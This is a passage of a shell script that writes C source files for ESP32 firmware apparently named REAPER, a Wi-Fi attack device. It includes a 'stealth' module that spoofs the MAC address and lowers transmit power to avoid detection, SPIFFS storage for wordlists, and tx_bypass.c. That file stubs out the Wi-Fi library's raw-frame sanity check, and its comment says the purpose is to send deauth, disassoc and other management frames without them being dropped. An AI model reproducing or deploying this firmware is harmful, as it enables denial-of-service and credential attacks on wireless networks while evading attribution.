#include "freertos/FreeRTOS.h"
#include "freertos/semphr.h"

static const char *TAG = "stealth";

/* 
 * TX Power configuration.
 * ESP-IDF esp_wifi_set_max_tx_power takes values in 0.25 dBm units.
 * Example: 19 dBm = 19 * 4 = 76.
 */
#define STEALTH_MIN_TX_POWER_DBM  0
#define STEALTH_MAX_TX_POWER_DBM  19

#define DBM_TO_ESP_IDF(dbm) ((int8_t)((dbm) * 4))

static atomic_int g_mode = STEALTH_MODE_OFF;
static uint8_t g_factory_mac[6];
static bool g_factory_mac_saved = false;

static SemaphoreHandle_t g_lock = NULL;

static uint32_t g_random_mac_switches = 0;
static uint32_t g_blocked_tx = 0;

/* -------------------------------------------------------------------------
 *  Helpers
 * ----------------------------------------------------------------------- */

static void set_random_mac_internal(void)
{
    uint8_t mac[6];
    esp_fill_random(mac, 6);
    
    /* Set locally administered bit (bit 1), clear multicast bit (bit 0) */
    mac[0] = (mac[0] & 0xFE) | 0x02; 
    
    esp_wifi_set_mac(WIFI_IF_STA, mac);
    g_random_mac_switches++;
    
    ESP_LOGI(TAG, "Random MAC set: %02X:%02X:%02X:%02X:%02X:%02X",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

static esp_err_t set_tx_power_dbm(int8_t dbm)
{
    return esp_wifi_set_max_tx_power(DBM_TO_ESP_IDF(dbm));
}

/* -------------------------------------------------------------------------
 *  Lifecycle
 * ----------------------------------------------------------------------- */

esp_err_t stealth_init(void)
{
    if (g_lock != NULL) {
        return ESP_OK;
    }

    g_lock = xSemaphoreCreateMutex();
    if (g_lock == NULL) {
        return ESP_ERR_NO_MEM;
    }

    atomic_store(&g_mode, STEALTH_MODE_OFF);
    g_factory_mac_saved = false;
    memset(g_factory_mac, 0, sizeof(g_factory_mac));
    g_random_mac_switches = 0;
    g_blocked_tx = 0;
    
    ESP_LOGI(TAG, "Stealth module initialized");
    return ESP_OK;
}

esp_err_t stealth_deinit(void)
{
    if (g_lock == NULL) return ESP_OK;

    stealth_set_mode(STEALTH_MODE_OFF);

    vSemaphoreDelete(g_lock);
    g_lock = NULL;
    return ESP_OK;
}

/* -------------------------------------------------------------------------
 *  Mode Control
 * ----------------------------------------------------------------------- */

esp_err_t stealth_set_mode(stealth_mode_t mode)
{
    if (g_lock == NULL) return ESP_ERR_INVALID_STATE;

    if (xSemaphoreTake(g_lock, pdMS_TO_TICKS(1000)) != pdTRUE) {
        return ESP_ERR_TIMEOUT;
    }

    stealth_mode_t current = atomic_load(&g_mode);
    if (current == mode) {
        xSemaphoreGive(g_lock);
        return ESP_OK;
    }

    switch (mode) {
        case STEALTH_MODE_OFF:
            /* Inline restore to avoid deadlock with public API */
            if (g_factory_mac_saved) {
                esp_wifi_set_mac(WIFI_IF_STA, g_factory_mac);
                ESP_LOGI(TAG, "Factory MAC restored");
            }
            set_tx_power_dbm(STEALTH_MAX_TX_POWER_DBM);
            break;

        case STEALTH_MODE_PASSIVE:
        case STEALTH_MODE_ACTIVE:
            if (!g_factory_mac_saved) {
                esp_wifi_get_mac(WIFI_IF_STA, g_factory_mac);
                g_factory_mac_saved = true;
            }
            set_random_mac_internal();
            set_tx_power_dbm(STEALTH_MIN_TX_POWER_DBM);
            break;

        default:
            xSemaphoreGive(g_lock);
            return ESP_ERR_INVALID_ARG;
    }

    atomic_store(&g_mode, mode);
    
    ESP_LOGI(TAG, "Stealth mode -> %s",
             mode == STEALTH_MODE_OFF ? "off" :
             mode == STEALTH_MODE_PASSIVE ? "passive" : "active");
             
    xSemaphoreGive(g_lock);
    return ESP_OK;
}

/* -------------------------------------------------------------------------
 *  Public Actions
 * ----------------------------------------------------------------------- */

esp_err_t stealth_set_random_mac(void)
{
    if (g_lock == NULL) return ESP_ERR_INVALID_STATE;

    if (xSemaphoreTake(g_lock, pdMS_TO_TICKS(1000)) != pdTRUE) {
        return ESP_ERR_TIMEOUT;
    }

    if (!g_factory_mac_saved) {
        esp_wifi_get_mac(WIFI_IF_STA, g_factory_mac);
        g_factory_mac_saved = true;
    }
    
    set_random_mac_internal();
    
    xSemaphoreGive(g_lock);
    return ESP_OK;
}

esp_err_t stealth_restore_mac(void)
{
    if (g_lock == NULL) return ESP_ERR_INVALID_STATE;

    if (xSemaphoreTake(g_lock, pdMS_TO_TICKS(1000)) != pdTRUE) {
        return ESP_ERR_TIMEOUT;
    }

    if (g_factory_mac_saved) {
        esp_wifi_set_mac(WIFI_IF_STA, g_factory_mac);
        ESP_LOGI(TAG, "Factory MAC restored");
    }
    
    xSemaphoreGive(g_lock);
    return ESP_OK;
}

esp_err_t stealth_set_min_tx_power(void)
{
    return set_tx_power_dbm(STEALTH_MIN_TX_POWER_DBM);
}

esp_err_t stealth_restore_tx_power(void)
{
    return set_tx_power_dbm(STEALTH_MAX_TX_POWER_DBM);
}

/* -------------------------------------------------------------------------
 *  Status & Checks
 * ----------------------------------------------------------------------- */

stealth_mode_t stealth_get_mode(void)
{
    return (stealth_mode_t)atomic_load(&g_mode);
}

bool stealth_can_transmit(void)
{
    return atomic_load(&g_mode) == STEALTH_MODE_ACTIVE;
}

esp_err_t stealth_check_tx(const char *module_name)
{
    (void)module_name; /* Decoupled: we block ALL TX in passive mode */

    if (atomic_load(&g_mode) == STEALTH_MODE_PASSIVE) {
        if (g_lock) {
            xSemaphoreTake(g_lock, portMAX_DELAY);
            g_blocked_tx++;
            xSemaphoreGive(g_lock);
        }
        return ESP_ERR_NOT_ALLOWED;
    }
    
    return ESP_OK;
}

esp_err_t stealth_json(char *buf, size_t bufsz)
{
    if (buf == NULL || bufsz == 0) return ESP_ERR_INVALID_ARG;
    if (g_lock == NULL) return ESP_ERR_INVALID_STATE;

    stealth_mode_t mode;
    uint32_t switches;
    uint32_t blocked;

    xSemaphoreTake(g_lock, portMAX_DELAY);
    mode = atomic_load(&g_mode);
    switches = g_random_mac_switches;
    blocked = g_blocked_tx;
    xSemaphoreGive(g_lock);

    const char *mode_str =
        (mode == STEALTH_MODE_OFF) ? "off" :
        (mode == STEALTH_MODE_PASSIVE) ? "passive" : "active";

    int n = snprintf(buf, bufsz,
                     "{\"mode\":\"%s\",\"mac_switches\":%"PRIu32",\"blocked_tx\":%"PRIu32"}",
                     mode_str, switches, blocked);
                     
    return (n < 0 || (size_t)n >= bufsz) ? ESP_ERR_NO_MEM : ESP_OK;
}
EOF_REAPER_FILE
echo "  Updated ${TARGET_DIR}/stealth.c"

cat << 'EOF_REAPER_FILE' > "${TARGET_DIR}/storage_sd.c"
#include "storage_sd.h"

#include <stdbool.h>
#include <stdatomic.h>
#include <string.h>

#include "esp_log.h"
#include "esp_system.h"
#include "esp_vfs_fat.h"
#include "sdmmc_cmd.h"
#include "driver/sdspi_host.h"
#include "driver/spi_common.h"

#include "freertos/FreeRTOS.h"
#include "freertos/semphr.h"

static const char *TAG = "storage_sd";

#define SD_MOUNT_POINT "/sd"

/* 
 * Hardware pin configuration. 
 * Adjust these to match your specific ESP32-S3 board wiring.
 */
#define SD_SPI_HOST     SPI2_HOST
#define SD_PIN_MOSI     11
#define SD_PIN_MISO     13
#define SD_PIN_CLK      12
#define SD_PIN_CS       10

static atomic_bool g_storage_ready = ATOMIC_VAR_INIT(false);
static sdmmc_card_t *g_sd_card = NULL;
static SemaphoreHandle_t g_lock = NULL;

esp_err_t storage_init(void)
{
    if (atomic_load(&g_storage_ready)) {
        return ESP_OK;
    }

    if (g_lock == NULL) {
        g_lock = xSemaphoreCreateMutex();
        if (g_lock == NULL) {
            return ESP_ERR_NO_MEM;
        }
    }

    if (xSemaphoreTake(g_lock, pdMS_TO_TICKS(1000)) != pdTRUE) {
        return ESP_ERR_TIMEOUT;
    }

    /* Double-check after acquiring lock */
    if (atomic_load(&g_storage_ready)) {
        xSemaphoreGive(g_lock);
        return ESP_OK;
    }

    esp_vfs_fat_sdmmc_mount_config_t mount_config = {
        .format_if_mount_failed = false, /* Never auto-format user SD cards */
        .max_files = 8,                  /* Increased slightly for concurrent exports */
        .allocation_unit_size = 16 * 1024
    };

    sdmmc_host_t host = SDSPI_HOST_DEFAULT();
    host.slot = SD_SPI_HOST;

    spi_bus_config_t bus_cfg = {
        .mosi_io_num = SD_PIN_MOSI,
        .miso_io_num = SD_PIN_MISO,
        .sclk_io_num = SD_PIN_CLK,
        .quadwp_io_num = -1,
        .quadhd_io_num = -1,
        .max_transfer_sz = 4000,
    };

    /* 
     * Initialize the SPI bus. 
     * If another module already initialized it, spi_bus_initialize returns 
     * ESP_ERR_INVALID_STATE. We can safely ignore that and continue.
     */
    esp_err_t ret = spi_bus_initialize(SD_SPI_HOST, &bus_cfg, SPI_DMA_CH_AUTO);
    if (ret != ESP_OK && ret != ESP_ERR_INVALID_STATE) {
        ESP_LOGE(TAG, "Failed to initialize SPI bus (%s)", esp_err_to_name(ret));
        xSemaphoreGive(g_lock);
        return ret;
    }

    sdspi_device_config_t slot_config = SDSPI_DEVICE_CONFIG_DEFAULT();
    slot_config.gpio_cs = SD_PIN_CS;
    slot_config.host_id = SD_SPI_HOST;

    ret = esp_vfs_fat_sdspi_mount(SD_MOUNT_POINT, &host, &slot_config, &mount_config, &g_sd_card);
    if (ret != ESP_OK) {
        ESP_LOGW(TAG, "SD card mount failed (%s). Check if card is inserted.", esp_err_to_name(ret));
        /* Do not free SPI bus here, as another module might be using it */
        xSemaphoreGive(g_lock);
        return ret;
    }

    atomic_store(&g_storage_ready, true);
    
    /* Calculate and log capacity */
    uint64_t capacity_bytes = (uint64_t)g_sd_card->csd.capacity * g_sd_card->csd.sector_size;
    (void)capacity_bytes;
    ESP_LOGI(TAG, "SD Card mounted successfully at %s (%.2f MB)", 
             SD_MOUNT_POINT, 
             (double)capacity_bytes / (1024.0 * 1024.0));
             
    xSemaphoreGive(g_lock);
    return ESP_OK;
}

void storage_deinit(void)
{
    if (!atomic_load(&g_storage_ready)) {
        return;
    }

    if (g_lock == NULL) return;

    if (xSemaphoreTake(g_lock, pdMS_TO_TICKS(1000)) != pdTRUE) {
        return;
    }

    if (!atomic_load(&g_storage_ready)) {
        xSemaphoreGive(g_lock);
        return;
    }

    if (g_sd_card != NULL) {
        esp_vfs_fat_sdcard_unmount(SD_MOUNT_POINT, g_sd_card);
        g_sd_card = NULL;
    }
    
    /* 
     * Note: We intentionally do NOT call spi_bus_free(SD_SPI_HOST) here.
     * If other peripherals (like an SPI display or sensor) share this bus,
     * freeing it would break them. The bus will be safely torn down on system reboot.
     */

    atomic_store(&g_storage_ready, false);
    ESP_LOGI(TAG, "SD storage unmounted");
    
    xSemaphoreGive(g_lock);
}

bool storage_is_ready(void)
{
    return atomic_load(&g_storage_ready);
}

const char* storage_sd_get_mount_point(void)
{
    return SD_MOUNT_POINT;
}

void storage_sd_print_info(FILE *out)
{
    if (out != NULL && g_sd_card != NULL) {
        sdmmc_card_print_info(out, g_sd_card);
    }
}
EOF_REAPER_FILE
echo "  Updated ${TARGET_DIR}/storage_sd.c"

cat << 'EOF_REAPER_FILE' > "${TARGET_DIR}/storage_sd.h"
#ifndef STORAGE_SD_H
#define STORAGE_SD_H

#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include "esp_err.h"

#ifdef __cplusplus
extern "C" {
#endif

/**
 * @brief Initialize and mount the SD card.
 * 
 * Safe to call multiple times; subsequent calls return ESP_OK if already mounted.
 */
esp_err_t storage_init(void);

/**
 * @brief Unmount the SD card.
 */
void storage_deinit(void);

/**
 * @brief Check if the SD card is currently mounted and ready.
 */
bool storage_is_ready(void);

/**
 * @brief Get the mount point path (e.g., "/sd").
 */
const char* storage_sd_get_mount_point(void);
void storage_sd_print_info(FILE *out);

static inline esp_err_t storage_sd_init(void) { return storage_init(); }
static inline esp_err_t storage_sd_mount(void) { return storage_init(); }
static inline bool storage_sd_is_ready(void) { return storage_is_ready(); }

#ifdef __cplusplus
}
#endif

#endif // STORAGE_SD_H
EOF_REAPER_FILE
echo "  Updated ${TARGET_DIR}/storage_sd.h"

cat << 'EOF_REAPER_FILE' > "${TARGET_DIR}/storage_spiffs.c"
/*
 * ============================================================================
 *  storage_spiffs.c  —  SPIFFS wordlist / blob storage for REAPER
 * ============================================================================
 */

#include "storage_spiffs.h"

#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <dirent.h>
#include <unistd.h>

#include "esp_log.h"
#include "esp_spiffs.h"
#include "esp_err.h"
#include "esp_heap_caps.h"

static const char *TAG = "spiffs";
static const char *BASE_PATH = "/spiffs";

/* -------------------------------------------------------------------------
 *  Helpers
 * ----------------------------------------------------------------------- */

static bool path_is_safe(const char *path)
{
    if (path == NULL) return false;
    /* Prevent directory traversal */
    if (strstr(path, "..") != NULL) return false;
    return true;
}

static void build_full_path(char *out, size_t out_sz, const char *path)
{
    if (path[0] == '/') {
        /* Absolute path provided */
        snprintf(out, out_sz, "%s", path);
    } else {
        /* Relative path provided */
        snprintf(out, out_sz, "%s/%s", BASE_PATH, path);
    }
}

/* -------------------------------------------------------------------------
 *  Lifecycle
 * ----------------------------------------------------------------------- */

esp_err_t storage_spiffs_init(void)
{
    if (storage_spiffs_is_ready()) {
        return ESP_OK;
    }

    esp_vfs_spiffs_conf_t conf = {
        .base_path = BASE_PATH,
        .partition_label = "spiffs",
        .max_files = 32,
        .format_if_mount_failed = true, /* Auto-format if corrupt/empty */
    };

    esp_err_t ret = esp_vfs_spiffs_register(&conf);
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "SPIFFS mount failed even after format attempt: %s", esp_err_to_name(ret));
        return ret;
    }

    size_t total = 0, used = 0;
    esp_spiffs_info(NULL, &total, &used);
    ESP_LOGI(TAG, "SPIFFS mounted at %s — %u kB used / %u kB total",
             BASE_PATH, (unsigned)(used / 1024), (unsigned)(total / 1024));
             
    return ESP_OK;
}

void storage_spiffs_deinit(void)
{
    if (storage_spiffs_is_ready()) {
        esp_vfs_spiffs_unregister(NULL);
        ESP_LOGI(TAG, "SPIFFS unmounted");
    }
}

bool storage_spiffs_is_ready(void)
{
    return esp_spiffs_mounted(NULL);
}

esp_err_t storage_spiffs_format(void)
{
    bool was_mounted = storage_spiffs_is_ready();
    
    if (was_mounted) {
        ESP_LOGW(TAG, "Unmounting SPIFFS for format...");
        esp_vfs_spiffs_unregister(NULL);
    }

    esp_err_t ret = esp_spiffs_format(NULL);
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "Format failed: %s", esp_err_to_name(ret));
        /* Attempt to remount even if format failed, to restore state */
        if (was_mounted) storage_spiffs_init();
        return ret;
    }
    
    ESP_LOGI(TAG, "SPIFFS formatted successfully");
    
    if (was_mounted) {
        return storage_spiffs_init();
    }
    
    return ESP_OK;
}

/* -------------------------------------------------------------------------
 *  File I/O
 * ----------------------------------------------------------------------- */

esp_err_t storage_spiffs_save_wordlist(const char *path, const void *data, size_t len)
{
    if (!path_is_safe(path) || !data || len == 0) return ESP_ERR_INVALID_ARG;
    if (!storage_spiffs_is_ready()) return ESP_ERR_INVALID_STATE;

    char full[128];
    build_full_path(full, sizeof(full), path);

    FILE *f = fopen(full, "wb");
    if (!f) {
        ESP_LOGE(TAG, "Failed to open %s for writing", full);
        return ESP_ERR_NOT_FOUND;
    }

    size_t written = fwrite(data, 1, len, f);
    
    /* CRITICAL: Flush and sync BEFORE closing to prevent UAF on fileno() */
    fflush(f);
    fsync(fileno(f));
    fclose(f);

    if (written != len) {
        ESP_LOGE(TAG, "Short write %zu/%zu to %s", written, len, full);
        return ESP_ERR_INVALID_SIZE;
    }

    ESP_LOGI(TAG, "Saved %s (%zu bytes)", full, len);
    return ESP_OK;
}

esp_err_t storage_spiffs_load_wordlist(const char *path, void **data_out, size_t *len_out)
{
    if (!path_is_safe(path) || !data_out || !len_out) return ESP_ERR_INVALID_ARG;
    if (!storage_spiffs_is_ready()) return ESP_ERR_INVALID_STATE;

    char full[128];
    build_full_path(full, sizeof(full), path);

    FILE *f = fopen(full, "rb");
    if (!f) return ESP_ERR_NOT_FOUND;

    fseek(f, 0, SEEK_END);
    long sz = ftell(f);
    fseek(f, 0, SEEK_SET);

    if (sz <= 0) {
        fclose(f);
        return ESP_ERR_INVALID_SIZE;
    }

    size_t largest_free = heap_caps_get_largest_free_block(MALLOC_CAP_SPIRAM);
    if ((size_t)sz > largest_free) {
        ESP_LOGE(TAG, "File %s (%ld bytes) exceeds largest free PSRAM block (%u)", 
                 full, sz, (unsigned)largest_free);
        fclose(f);
        return ESP_ERR_NO_MEM;
    }

    void *buf = heap_caps_malloc((size_t)sz, MALLOC_CAP_SPIRAM);
    if (!buf) {
        fclose(f);
        return ESP_ERR_NO_MEM;
    }

    size_t rd = fread(buf, 1, (size_t)sz, f);
    fclose(f);

    if (rd != (size_t)sz) {
        heap_caps_free(buf);
        return ESP_ERR_INVALID_SIZE;
    }

    *data_out = buf;
    *len_out = (size_t)rd;
    return ESP_OK;
}

void storage_spiffs_free_buffer(void *data)
{
    if (data) heap_caps_free(data);
}

/* -------------------------------------------------------------------------
 *  Directory Listing
 * ----------------------------------------------------------------------- */

static int list_filter(const struct dirent *d)
{
    return (d->d_name[0] != '.');
}

esp_err_t storage_spiffs_list_wordlists(char ***names, size_t *count)
{
    if (!names || !count) return ESP_ERR_INVALID_ARG;
    if (!storage_spiffs_is_ready()) return ESP_ERR_INVALID_STATE;

    struct dirent **entries = NULL;
    int n = scandir(BASE_PATH, &entries, list_filter, NULL);
    if (n <= 0) {
        *names = NULL;
        *count = 0;
        return (n == 0) ? ESP_OK : ESP_ERR_NOT_FOUND;
    }

    char **out = heap_caps_calloc(n, sizeof(char *), MALLOC_CAP_DEFAULT);
    if (!out) {
        for (int i = 0; i < n; i++) free(entries[i]);
        free(entries);
        return ESP_ERR_NO_MEM;
    }

    size_t valid = 0;
    for (int i = 0; i < n; i++) {
        char full[300];
        snprintf(full, sizeof(full), "%s/%s", BASE_PATH, entries[i]->d_name);
        struct stat st;
        if (stat(full, &st) == 0 && S_ISREG(st.st_mode)) {
            out[valid++] = strdup(entries[i]->d_name);
        }
        free(entries[i]);
    }
    free(entries);

    *names = out;
    *count = valid;
    return ESP_OK;
}

void storage_spiffs_free_list(char **names, size_t count)
{
    if (!names) return;
    for (size_t i = 0; i < count; i++) {
        if (names[i]) free(names[i]); /* strdup uses standard malloc */
    }
    heap_caps_free(names); /* heap_caps_calloc used for the array */
}

esp_err_t storage_spiffs_usage(uint64_t *total, uint64_t *used)
{
    if (!total || !used) return ESP_ERR_INVALID_ARG;
    if (!storage_spiffs_is_ready()) return ESP_ERR_INVALID_STATE;

    size_t t = 0, u = 0;
    esp_err_t ret = esp_spiffs_info(NULL, &t, &u);
    if (ret != ESP_OK) return ret;
    *total = t;
    *used = u;
    return ESP_OK;
}

esp_err_t storage_spiffs_list_wordlists_json(char *buf, size_t bufsz)
{
    if (!buf || bufsz == 0) return ESP_ERR_INVALID_ARG;
    char **names = NULL;
    size_t count = 0;
    esp_err_t rc = storage_spiffs_list_wordlists(&names, &count);
    if (rc != ESP_OK) return rc;

    size_t off = 0;
    int n = snprintf(buf + off, bufsz - off, "[");
    if (n < 0 || (size_t)n >= bufsz - off) {
        storage_spiffs_free_list(names, count);
        return ESP_ERR_NO_MEM;
    }
    off += (size_t)n;

    for (size_t i = 0; i < count; i++) {
        n = snprintf(buf + off, bufsz - off, "%s\"%s\"", (i > 0) ? "," : "", names[i] ? names[i] : "");
        if (n < 0 || (size_t)n >= bufsz - off) {
            storage_spiffs_free_list(names, count);
            return ESP_ERR_NO_MEM;
        }
        off += (size_t)n;
    }
    storage_spiffs_free_list(names, count);

    n = snprintf(buf + off, bufsz - off, "]");
    if (n < 0 || (size_t)n >= bufsz - off) return ESP_ERR_NO_MEM;
    return ESP_OK;
}

esp_err_t storage_spiffs_load_wordlist_meta(const char *name)
{
    if (!path_is_safe(name)) return ESP_ERR_INVALID_ARG;
    if (!storage_spiffs_is_ready()) return ESP_ERR_INVALID_STATE;
    char full[128];
    build_full_path(full, sizeof(full), name);
    struct stat st;
    if (stat(full, &st) != 0 || !S_ISREG(st.st_mode)) {
        return ESP_ERR_NOT_FOUND;
    }
    return ESP_OK;
}
EOF_REAPER_FILE
echo "  Updated ${TARGET_DIR}/storage_spiffs.c"

cat << 'EOF_REAPER_FILE' > "${TARGET_DIR}/storage_spiffs.h"
#ifndef STORAGE_SPIFFS_H
#define STORAGE_SPIFFS_H

#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include "esp_err.h"

#ifdef __cplusplus
extern "C" {
#endif

esp_err_t storage_spiffs_init(void);
void storage_spiffs_deinit(void);
bool storage_spiffs_is_ready(void);

/* 
 * Formats the SPIFFS partition. 
 * Safely unmounts, formats, and remounts if currently active.
 */
esp_err_t storage_spiffs_format(void);

/* 
 * File I/O. 
 * `path` can be absolute (e.g., "/spiffs/models/x.bin") or relative ("models/x.bin").
 */
esp_err_t storage_spiffs_save_wordlist(const char *path, const void *data, size_t len);
esp_err_t storage_spiffs_load_wordlist(const char *path, void **data_out, size_t *len_out);
void storage_spiffs_free_buffer(void *data);

esp_err_t storage_spiffs_list_wordlists(char ***names, size_t *count);
esp_err_t storage_spiffs_list_wordlists_json(char *buf, size_t bufsz);
esp_err_t storage_spiffs_load_wordlist_meta(const char *name);
void storage_spiffs_free_list(char **names, size_t count);

esp_err_t storage_spiffs_usage(uint64_t *total, uint64_t *used);

#ifdef __cplusplus
}
#endif

#endif // STORAGE_SPIFFS_H
EOF_REAPER_FILE
echo "  Updated ${TARGET_DIR}/storage_spiffs.h"

cat << 'EOF_REAPER_FILE' > "${TARGET_DIR}/structured_log.c"
/*
 * ============================================================================
 *  structured_log.c  —  Ring-buffer structured logging + JSON export
 * ============================================================================
 */

#include "structured_log.h"

#include <string.h>
#include <stdio.h>
#include <stdarg.h>
#include <stdatomic.h>

#include "esp_log.h"
#include "esp_timer.h"
#include "esp_heap_caps.h"

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"

#include "cJSON.h"

static const char *TAG = "slog";

#define LOG_CAPACITY 1024
#define LOG_MSG_MAX  160

typedef struct {
    uint64_t    timestamp_us;
    char        tag[24];
    log_level_t level;
    char        message[LOG_MSG_MAX];
} log_entry_t;

static log_entry_t *g_ring = NULL;
static uint32_t g_head = 0;
static atomic_bool g_initialized = ATOMIC_VAR_INIT(false);

static SemaphoreHandle_t g_lock = NULL;

static bool g_filter_set = false;
static char g_filter_tag[48] = {0};
static log_level_t g_filter_min = LOG_LEVEL_VERBOSE;

static inline uint32_t ring_index(uint32_t seq)
{
    return seq % LOG_CAPACITY;
}

/* Must be called while holding g_lock */
static inline bool matches_filter_locked(const char *tag, log_level_t level)
{
    if (!g_filter_set) return true;
    if (level < g_filter_min) return false;
    if (g_filter_tag[0] == '\0') return true;
    if (tag == NULL) return false;
    return strstr(tag, g_filter_tag) != NULL;
}

esp_err_t structured_log_init(void)
{
    if (atomic_load(&g_initialized)) return ESP_OK;

    if (g_lock == NULL) {
        g_lock = xSemaphoreCreateMutex();
        if (g_lock == NULL) return ESP_ERR_NO_MEM;
    }

    if (g_ring == NULL) {
        g_ring = heap_caps_malloc(LOG_CAPACITY * sizeof(log_entry_t), MALLOC_CAP_SPIRAM | MALLOC_CAP_8BIT);
        if (!g_ring) {
            ESP_LOGE(TAG, "PSRAM allocation failed for log ring");
            return ESP_ERR_NO_MEM;
        }
    }

    memset(g_ring, 0, LOG_CAPACITY * sizeof(log_entry_t));
    g_head = 0;
    g_filter_set = false;
    g_filter_tag[0] = '\0';
    g_filter_min = LOG_LEVEL_VERBOSE;
    
    atomic_store(&g_initialized, true);

    ESP_LOGI(TAG, "Structured log ready: %u entries, PSRAM", LOG_CAPACITY);
    return ESP_OK;
}

void structured_log_write(const char *tag, log_level_t level, const char *fmt, ...)
{
    if (!atomic_load(&g_initialized) || !g_ring || !fmt) return;

    /* 
     * Non-blocking lock acquisition. 
     * If the system is heavily contended or a task is deadlocked holding 
     * the log lock, we drop the log message rather than hanging the caller.
     */
    if (xSemaphoreTake(g_lock, 0) != pdTRUE) {
        return; 
    }

    if (!matches_filter_locked(tag, level)) {
        xSemaphoreGive(g_lock);
        return;
    }

    uint32_t seq = g_head++;
    uint32_t idx = ring_index(seq);

    log_entry_t *e = &g_ring[idx];
    e->timestamp_us = esp_timer_get_time();
    e->level = level;

    if (tag) {
        snprintf(e->tag, sizeof(e->tag), "%s", tag);
    } else {
        snprintf(e->tag, sizeof(e->tag), "?");
    }

    va_list ap;
    va_start(ap, fmt);
    vsnprintf(e->message, sizeof(e->message), fmt, ap);
    va_end(ap);

    xSemaphoreGive(g_lock);
}

void structured_log_set_filter(const char *tag_substr, log_level_t min_level)
{
    if (g_lock == NULL) return;

    xSemaphoreTake(g_lock, portMAX_DELAY);
    g_filter_set = true;
    g_filter_min = min_level;
    if (tag_substr) {
        snprintf(g_filter_tag, sizeof(g_filter_tag), "%s", tag_substr);
    } else {
        g_filter_tag[0] = '\0';
    }
    xSemaphoreGive(g_lock);
}

static cJSON *entry_to_json(const log_entry_t *e)
{
    cJSON *obj = cJSON_CreateObject();
    if (!obj) return NULL;

    cJSON_AddNumberToObject(obj, "ts", (double)e->timestamp_us / 1000000.0);
    cJSON_AddStringToObject(obj, "tag", e->tag);
    cJSON_AddNumberToObject(obj, "level", (int)e->level);

    cJSON *msg = cJSON_CreateString(e->message);
    if (!msg) { 
        cJSON_Delete(obj); 
        return NULL; 
    }
    cJSON_AddItemToObject(obj, "msg", msg);

    return obj;
}

esp_err_t structured_log_export_json(const char *path)
{
    if (!atomic_load(&g_initialized) || !g_ring || !path) return ESP_ERR_INVALID_STATE;

    FILE *f = fopen(path, "w");
    if (!f) {
        ESP_LOGE(TAG, "Failed to open %s for log export", path);
        return ESP_ERR_NOT_FOUND;
    }

    fprintf(f, "[\n");

    uint32_t total = 0;
    uint32_t start = 0;

    xSemaphoreTake(g_lock, portMAX_DELAY);
    total = g_head;
    start = (total > LOG_CAPACITY) ? (total - LOG_CAPACITY) : 0;
    xSemaphoreGive(g_lock);

    bool first = true;
    uint32_t exported_count = 0;

    for (uint32_t i = start; i < total; i++) {
        log_entry_t local_e;

        xSemaphoreTake(g_lock, portMAX_DELAY);
        memcpy(&local_e, &g_ring[ring_index(i)], sizeof(log_entry_t));
        xSemaphoreGive(g_lock);

        if (local_e.message[0] == '\0') continue;

        cJSON *obj = entry_to_json(&local_e);
        if (!obj) continue;

        char *out = cJSON_PrintUnformatted(obj);
        cJSON_Delete(obj);

        if (out) {
            if (!first) {
                fprintf(f, ",\n");
            }
            fprintf(f, "%s", out);
            cJSON_free(out);
            first = false;
            exported_count++;
        }
    }

    fprintf(f, "\n]\n");
    fclose(f);

    ESP_LOGI(TAG, "Exported %u entries to %s", (unsigned)exported_count, path);
    return ESP_OK;
}

void structured_log_clear(void)
{
    if (!atomic_load(&g_initialized) || !g_ring || !g_lock) return;
    
    xSemaphoreTake(g_lock, portMAX_DELAY);
    memset(g_ring, 0, LOG_CAPACITY * sizeof(log_entry_t));
    g_head = 0;
    xSemaphoreGive(g_lock);
    
    ESP_LOGI(TAG, "Log ring cleared");
}

size_t structured_log_count(void)
{
    if (!atomic_load(&g_initialized)) return 0;
    
    uint32_t total = 0;
    if (g_lock) {
        xSemaphoreTake(g_lock, portMAX_DELAY);
        total = g_head;
        xSemaphoreGive(g_lock);
    }
    return (total > LOG_CAPACITY) ? LOG_CAPACITY : total;
}

size_t structured_log_capacity(void)
{
    return LOG_CAPACITY;
}
EOF_REAPER_FILE
echo "  Updated ${TARGET_DIR}/structured_log.c"

cat << 'EOF_REAPER_FILE' > "${TARGET_DIR}/tx_bypass.c"
#include <stdint.h>
#include <stdbool.h>
#include <stdatomic.h>

/*
 * Overrides the closed Wi-Fi lib's raw-frame sanity gate.
 * Providing both __wrap_ieee80211_raw_frame_sanity_check (used when
 * -Wl,--wrap=ieee80211_raw_frame_sanity_check is active in CMakeLists.txt)
 * and ieee80211_raw_frame_sanity_check ensures raw 802.11 management/data
 * frames (deauth, disassoc, auth, beacon, probe) are never dropped.
 */
int __wrap_ieee80211_raw_frame_sanity_check(int32_t arg1, const void *frame, int32_t len, bool en_sys_seq)
{
    (void)arg1;
    (void)frame;
    (void)len;
    (void)en_sys_seq;
    return 0;
}

int ieee80211_raw_frame_sanity_check(int32_t arg1, const void *frame, int32_t len, bool en_sys_seq)
{
    (void)arg1;
    (void)frame;
    (void)len;
    (void)en_sys_seq;
    return 0;
}
EOF_REAPER_FILE
echo "  Updated ${TARGET_DIR}/tx_bypass.c"

cat << 'EOF_REAPER_FILE' > "${TARGET_DIR}/usb_cdc.c"
/*
 * ============================================================================
 *  usb_cdc.c  —  TinyUSB CDC-ACM Transport Layer
 * ============================================================================
 */

#include <string.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdatomic.h>

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"
#include "esp_system.h"
#include "esp_mac.h"
#include "esp_log.h"
#include "esp_timer.h"
#include "nvs_flash.h"
#include "nvs.h"

#if __has_include("tusb.h")
#include "tusb.h"  /* Required for tud_cdc_* APIs */
#else
#ifndef CFG_TUD_CDC_TX_BUFSIZE
#define CFG_TUD_CDC_TX_BUFSIZE 64
#endif
static inline bool tud_cdc_connected(void) { return false; }
static inline uint32_t tud_cdc_write_available(void) { return 0; }
static inline uint32_t tud_cdc_write(const void *buffer, uint32_t bufsize) { (void)buffer; (void)bufsize; return 0; }
static inline uint32_t tud_cdc_write_flush(void) { return 0; }
static inline uint32_t tud_cdc_available(void) { return 0; }
static inline uint32_t tud_cdc_read(void *buffer, uint32_t bufsize) { (void)buffer; (void)bufsize; return 0; }
#endif

